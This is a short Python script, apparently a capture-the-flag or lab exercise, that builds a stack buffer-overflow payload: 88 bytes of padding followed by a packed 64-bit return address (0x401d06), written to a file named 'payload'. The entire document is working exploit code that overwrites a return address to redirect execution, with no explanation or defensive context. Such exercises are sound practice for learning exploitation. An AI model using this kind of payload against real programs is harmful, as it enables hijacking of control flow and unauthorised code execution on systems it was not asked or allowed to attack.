#!/usr/bin/env python3

from struct import pack


payload = b'a' * 88
payload += pack("<Q", 0x401d06)

with open("payload", "wb") as f:
    f.write(payload)
